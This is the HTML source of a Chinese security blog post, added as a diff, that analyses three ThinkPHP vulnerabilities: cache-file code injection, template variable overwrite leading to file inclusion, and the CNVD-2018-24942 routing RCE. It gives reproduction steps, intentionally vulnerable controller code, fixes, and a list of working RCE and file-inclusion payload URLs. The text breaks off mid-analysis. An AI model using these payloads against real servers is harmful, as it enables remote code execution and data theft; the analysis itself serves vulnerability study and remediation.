@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo180.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/ico32.jpg?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/ico16.jpg?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="study," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1. ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致代码执行0x00 背景网站为了提高访问效率往往会将用户访问过的页面存入缓存来减少开销。而Thinkphp 在使用缓存的时候是将数据序列化，然后存进一个 php 文件中，这使得命令执行等行为成为可能。">
+<meta name="keywords" content="study">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 漏洞分析总结（主要RCE和文件">
+<meta property="og:url" content="http://yoursite.com/2020/09/08/ThinkPHP漏洞分析/index.html">
+<meta property="og:site_name" content="Hyasin&#39;s blog">
+<meta property="og:description" content="1. ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致代码执行0x00 背景网站为了提高访问效率往往会将用户访问过的页面存入缓存来减少开销。而Thinkphp 在使用缓存的时候是将数据序列化，然后存进一个 php 文件中，这使得命令执行等行为成为可能。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/c3c1f79f95fe682342bb3ef36815f904_59041.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/999d0d725e50b4017f62180ec8014497_34854.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/dc86a0e8cdffc559eea75b79b3032970_52876.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/f257385941eaee87e82cdf3aedc91c06_54128.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/612a8244d09d8ad459adaf1e8679c758_68427.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/cc49f1b0eb955dfaf2b9db2e7333016f_87244.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/611203f7cc38b361048347d67122d716_48367.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/bcd54d3428adfcf40d862d32bcedd689_25221.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/71a2f50a24b6e27a1b7859b8e8ddac1f_43272.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/402577de03723d0078fbbd2587730861_24250.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/75d77eaf770645386784cec058b10a85_97352.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/0cd662faafb541321a3d614559e54f8d_13225.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/253122b45e56013a85111c6a4846b4ef_68328.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/7915ac0ed6d237ee996ad4dffcd03197_29736.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/403f8400b1ca134e0a04ed74143bdbfd_73508.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/3283119d48a0816f8c75947a17e27023_43341.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/9db7ddfbacd3b95b30733258f62272da_82333.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/2aa70c2ded5e309390c529065a3ffa9a_48395.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/06b5e3b74609fce8e06b6e56e7704872_62729.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/856e97fe8ff106c17c4c6d8bf306a866_84302.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/85dcfaf1c65b3778ccbefb5dc7f194f7_32900.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/fd414204b61db713e5179fc6357b4964_53512.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/db1387a7ae8c066a21fe8d5e0d95efcd_96930.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/0f2b2fb111bb68ffda3efc45933ee4fe_82127.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/1a8d6fb597efd751c62934e06e168cd1_56322.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/03124f56c1c1e04a84482bc3e38e2983_40877.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/f5d4000a348a2fe210b6afdc07c0f2cc_43711.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/09e4d3849ee025c0ad0fc8d6736042e5_28412.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/61ab4ffe4495591a5d09eda9eb63f423_71018.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/79fe7d4267d5ea720c35b16389cca12e_26127.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/7f663385cf7340baf87a78d09ef88649_94387.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/7cfb18732582d59c45925d4b7f1d017c_12657.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/282c96274192cd4d961b2cbac6057124_64493.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/0e29c16203fddc1cc5de33a684bf3b2e_36857.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/cab68f6fc337145270faed95df03281b_55490.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/b0344de2af92b70cef9835233a8f2fb6_67585.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/1a57b3950fc88ffd708d31961df70d7e_69473.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/8b43fd9f996d3b7a202280e6fdc47b4c_15515.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/b892579f76ad5999c5086b42947de698_93773.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/8cbe6a0d3c71df5b5a4c09f7de68d796_31063.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/f0e293839f12470ab599d149314d688c_48689.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/3393821ee4665f2172529376d43fbdc0_92807.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/1275a5f769d456baeca2d7520dd75a90_99317.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/945d87879a8b5bf8f4068d3795727f42_22132.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/a1994f3a32bef84fde9fcd21e82b19f0_47631.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/449c7bfb8dd873525bb67dc13a41fdb8_48366.png">
+<meta property="og:image" content="https://nc0.cdn.zkaq.cn/md/6508/0c2dd265609a9031e2fe966164a58df1_68723.png">
+<meta property="og:updated_time" content="2020-09-15T03:02:46.680Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP 漏洞分析总结（主要RCE和文件">
+<meta name="twitter:description" content="1. ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致代码执行0x00 背景网站为了提高访问效率往往会将用户访问过的页面存入缓存来减少开销。而Thinkphp 在使用缓存的时候是将数据序列化，然后存进一个 php 文件中，这使得命令执行等行为成为可能。">
+<meta name="twitter:image" content="https://nc0.cdn.zkaq.cn/md/6508/c3c1f79f95fe682342bb3ef36815f904_59041.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/09/08/ThinkPHP漏洞分析/"/>
+
+
+
+
+
+  <title>ThinkPHP 漏洞分析总结（主要RCE和文件 | Hyasin's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hyasin's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/08/ThinkPHP漏洞分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hyasin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/tou.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hyasin's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ThinkPHP 漏洞分析总结（主要RCE和文件</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-08T00:00:00+08:00">
+                2020-09-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="1-ThinkPHP-5-0-10-3-2-3-缓存函数设计缺陷可导致代码执行"><a href="#1-ThinkPHP-5-0-10-3-2-3-缓存函数设计缺陷可导致代码执行" class="headerlink" title="1. ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致代码执行"></a>1. ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致代码执行</h2><h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>网站为了提高访问效率往往会将用户访问过的页面存入缓存来减少开销。而Thinkphp 在使用缓存的时候是将数据序列化，然后存进一个 php 文件中，这使得命令执行等行为成为可能。</p>
+<a id="more"></a>
+<h3 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h3><p>系统环境</p>
+<p>服务器主机：centOS 7</p>
+<p>php 5.4版本，apache2，ThinkPHP 5.0.10</p>
+<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>将 <strong>application/index/controller/Index.php</strong> 文件中代码更改如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cache::set(<span class="string">"name"</span>,input(<span class="string">"get.username"</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="string">'Cache success'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>访问 <a href="http://localhost/tpdemo/public/?username=xxx%0d%0aphpinfo();//" target="_blank" rel="noopener">http://localhost/tpdemo/public/?username=xxx%0d%0aphpinfo();//</a> ，即可将 webshell 等写入缓存文件。<br><img src="https://nc0.cdn.zkaq.cn/md/6508/c3c1f79f95fe682342bb3ef36815f904_59041.png" alt=""><br><img src="https://nc0.cdn.zkaq.cn/md/6508/999d0d725e50b4017f62180ec8014497_34854.png" alt=""></p>
+<h3 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h3><p>首先，查看缓存调用的方法<br><img src="https://nc0.cdn.zkaq.cn/md/6508/dc86a0e8cdffc559eea75b79b3032970_52876.png" alt=""><br>跟进set方法，可见此处动态实例化了一个类<br><img src="https://nc0.cdn.zkaq.cn/md/6508/f257385941eaee87e82cdf3aedc91c06_54128.png" alt=""><br>从这个代码中我们可以看出来，这里获取外部一个配置的数组然后传<br>进了方法，而默认的cache.type为“File”，这个方法会根据我们的配置数据来动态的调用类执行不同的缓存操作<br><img src="https://nc0.cdn.zkaq.cn/md/6508/612a8244d09d8ad459adaf1e8679c758_68427.png" alt=""><br>查看connect函数，这里通过一系列判断，根据cache.type的值，找到cache驱动为File，对应44行的think\cache\driver\File类。然后在51行进行实例化，并将其return。<br><img src="https://nc0.cdn.zkaq.cn/md/6508/cc49f1b0eb955dfaf2b9db2e7333016f_87244.png" alt=""><br>跟进到file类的set函数，可以看到 data 数据没有经过任何处理，只是序列化后拼接存储在文件中，这里的 $this-&gt;options[‘data_compress’] 变量默认情况下为 false ，所以数据不会经过 gzcompress 函数处理。虽然在序列化数据前面拼接了单行注释符 // ，但是我们可以通过注入换行符绕过该限制。<br><img src="https://nc0.cdn.zkaq.cn/md/6508/611203f7cc38b361048347d67122d716_48367.png" alt=""><br>最后查看一下文件名的生成方法，可以看到文件名是通过调用 getCacheKey 方法获得的。缓存文件的子目录和文件名均和缓存类设置的键有关（如本例中缓存类设置的键为 name ）。程序先获得键名的 md5 值，然后将该 md5 值的前 2 个字符作为缓存子目录，后 30 字符作为缓存文件名。如果应用程序还设置了前缀 $this-&gt;options[‘prefix’] ，那么缓存文件还将多一个上级目录。<br><img src="https://nc0.cdn.zkaq.cn/md/6508/bcd54d3428adfcf40d862d32bcedd689_25221.png" alt=""><br>总结一下，在源码中找到Cache::set(name, value, expire)，其中缓存文件名是跟name相关联的，因此可以看作是一个已知条件。漏洞的关键点就是是否开启缓存，value是否可控。</p>
+<h3 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04 修复方案"></a>0x04 修复方案</h3><p>从重现过程可以看出，在缓存文件里攻击者通过换行写入了恶意代码。可以参考引用文章中的修复方法：</p>
+<p>1，打开文件：thinkphp\library\think\cache\driver\File.php<br>2，找到：public function set($name, $value, $expire = null) 方法<br>3，添加：$data = str_replace(PHP_EOL, ”, $data); 即去掉换行。</p>
+<h3 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h3><p><a href="https://paper.seebug.org/374/" target="_blank" rel="noopener">ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致 Getshell</a><br><a href="https://www.lsablog.com/networksec/penetration/thinkphp-cache-function-design-defects-getshell-bug-repeat-and-analysis/" target="_blank" rel="noopener">Thinkphp缓存函数设计缺陷getshell漏洞重现及分析</a></p>
+<h2 id="2-ThinkPHP-5-x-变量覆盖导致的文件包含-amp-任意代码执行"><a href="#2-ThinkPHP-5-x-变量覆盖导致的文件包含-amp-任意代码执行" class="headerlink" title="2. ThinkPHP 5.x 变量覆盖导致的文件包含&amp;任意代码执行"></a>2. ThinkPHP 5.x 变量覆盖导致的文件包含&amp;任意代码执行</h2><h3 id="0x00-背景-1"><a href="#0x00-背景-1" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>影响版本：<strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong>。</p>
+<p>ThinkPHP在加载模版解析变量时存在变量覆盖的问题，且没有对 <strong>$cacheFile</strong> 进行相应的消毒处理，导致模板文件的路径可以被覆盖，从而导致任意文件包含漏洞的发生。</p>
+<h3 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>环境：centOS 7, php 5.4, ThinkPHP 5.0.10</p>
+<p>首先将 <code>application/index/controller/Index.php</code> 文件代码设置如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>创建 <code>application/index/view/index/index.html</code> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错），并将图片马 <code>1.jpg</code> 放至 <code>public</code> 目录下（模拟上传图片操作）。接着访问 </p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/tp5_10/<span class="keyword">public</span>/<span class="built_in">index</span>.php/<span class="built_in">index</span>/<span class="built_in">index</span>?cacheFile=<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
+<p> 链接，即可触发 <code>文件包含漏洞</code> 。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/71a2f50a24b6e27a1b7859b8e8ddac1f_43272.png" alt=""></p>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p> 我们可以查看官方更新的<code>commit</code>记录，发现其改进了模板引擎，其中存在危险函数<code>extract</code>，有可能引发变量覆盖漏洞。</p>
+<p> 程序在一开始会调用 <code>&quot;thinkphp\library\think\Controller.php&quot;</code>文件中的 <code>assign</code>方法，并传入 <code>POST</code> 数组数据， <code>assign</code>方法代码如下，其调用了view类中的<code>assign</code>方法：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/402577de03723d0078fbbd2587730861_24250.png" alt=""></p>
+<p> 查看视图类中的assign方法代码，在<code>&quot;thinkphp\library\think\View.php&quot;</code> 文件中。可以看到该方法用 <code>array_merge</code>方法将 POST 数组数据合并到 <code>$this-&gt;data</code>中，代码如下：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/75d77eaf770645386784cec058b10a85_97352.png" alt=""></p>
+<p> 接下来查看fetch方法的代码，该方法用于输出模板内容，代码定义在 <code>&quot;thinkphp\library\think\Controller.php&quot;</code>文件中，该方法同样调用的是视图类中的 fetch 方法，代码如下：</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/0cd662faafb541321a3d614559e54f8d_13225.png" alt=""></p>
+<p> 视图类中的fetch方法，这里<code>this-&gt;data</code>可控，程序调用fetch方法加载模板输出。在默认情况下 <code>$method</code>的值为 fetch ，也就是说调用了视图引擎中的 fetch 方法，该方法在<code>&quot;thinkphp\library\think\view\driver\Think.php&quot;</code> 文件中，这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似<code>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</code>，如果默认路径模板不存在，程序就会报错。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/253122b45e56013a85111c6a4846b4ef_68328.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/7915ac0ed6d237ee996ad4dffcd03197_29736.png" alt=""></p>
+<p>我们跟进到 Template 类的 fetch 方法，可以发现可控变量 $vars 赋值给<code>$this-&gt;data</code> 并最终传入 File 类的 read 方法。而 read 方法中在使用了 extract 函数后，直接包含了 <code>$cacheFile</code>变量。这里就是漏洞发生的关键原因（可以通过 extract 函数，直接覆盖 <code>$cacheFile</code>变量，因为 extract 函数中的参数 <code>$vars</code>可以由用户控制）。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/403f8400b1ca134e0a04ed74143bdbfd_73508.png" alt=""></p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/3283119d48a0816f8c75947a17e27023_43341.png" alt=""></p>
+<p>如果目标站点开启了 <code>allow_url_include</code> ，攻击者甚至可以执行任意代码。</p>
+<h3 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h3><p>官方的修复方法是：先将<code>$cacheFile</code>变量存储在<code>$this-&gt;cacheFile</code>中，在使用 extract 函数后，最终 include 的变量是 <code>$this-&gt;cacheFile</code>，这样也就避免了 include 被覆盖后的变量值。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/9db7ddfbacd3b95b30733258f62272da_82333.png" alt=""></p>
+<h3 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h3><p><a href="https://www.freebuf.com/articles/web/207878.html" target="_blank" rel="noopener">ThinkPHP5漏洞分析之文件包含</a></p>
+<p><a href="http://www.bubuko.com/infodetail-3516646.html" target="_blank" rel="noopener">http://www.bubuko.com/infodetail-3516646.html</a></p>
+<h2 id="3-ThinkPHP-5-0-x-未开启强制路由导致的RCE-漏洞分析"><a href="#3-ThinkPHP-5-0-x-未开启强制路由导致的RCE-漏洞分析" class="headerlink" title="3. ThinkPHP 5.0.x 未开启强制路由导致的RCE 漏洞分析"></a>3. ThinkPHP 5.0.x 未开启强制路由导致的RCE 漏洞分析</h2><h3 id="0x00-背景-2"><a href="#0x00-背景-2" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>影响版本：(ThinkPHP 5.0.5-5.0.22 || 5.1.0-5.1.30) </p>
+<p>漏洞编号：CNVD-2018-24942</p>
+<p>此漏洞是因为框架对传入的路由参数过滤不严格，导致攻击者可以操作非预期的控制器类来远程执行代码。其中不同版本 <strong>payload</strong> 需稍作调整：</p>
+<p><strong>5.1.x</strong> ：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</span><br><span class="line">?s=index/\think\view\driver\Php/display&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span></span><br><span class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="xml"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span></span><br><span class="line">?s=index/\think\Container/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure>
+<p><strong>5.0.x</strong> ：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\config/get&amp;name=database.username # 获取配置信息</span><br><span class="line">?s=index/\think\Lang/load&amp;file=../../test.jpg # 包含任意文件</span><br><span class="line">?s=index/\think\Config/load&amp;file=../../t.php # 包含任意.php文件</span><br><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=id</span><br></pre></td></tr></table></figure>
+<p>本文是针对ThinkPHP v5.1.x版本的漏洞分析，v5.0.x版本会稍有不同。</p>
+<h3 id="0x01-漏洞复现-1"><a href="#0x01-漏洞复现-1" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h3><p>此处的实验环境为centOS 7，php 5.4，<strong>thinkphp 5.1.29</strong></p>
+<p>通过给出的POC直接访问url即能触发漏洞</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/2aa70c2ded5e309390c529065a3ffa9a_48395.png" alt=""></p>
+<h3 id="0x02-漏洞分析-1"><a href="#0x02-漏洞分析-1" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>首先，默认情况下安装的 ThinkPHP 没有开启强制路由选项，而且默认开启路由兼容模式。</p>
+<p><img src="https://nc0.cdn.zkaq.cn/md/6508/06b5e3b74609fce8e06b6e56e7704872_62729.png" alt=""></p>
+<p>由于没有开启强制路由，说明我们可以使用路由兼容模式 <strong>s</strong> 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器，那么我们可以试着利用 <strong><a href="http://site/?s=模块/控制器/方法" target="_blank" rel="noopener">http://site/?s=模块/控制器/方法</a></strong> 来测试。我们知道所有用户参数都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法处理，该方法会调用 <strong>filterValue</strong> 方法，而 <strong>filterValue</strong> 方法中使用了 <strong>call_user_func</strong> ，那么我们就来尝试利用这个方法。访问如下链接：</p>
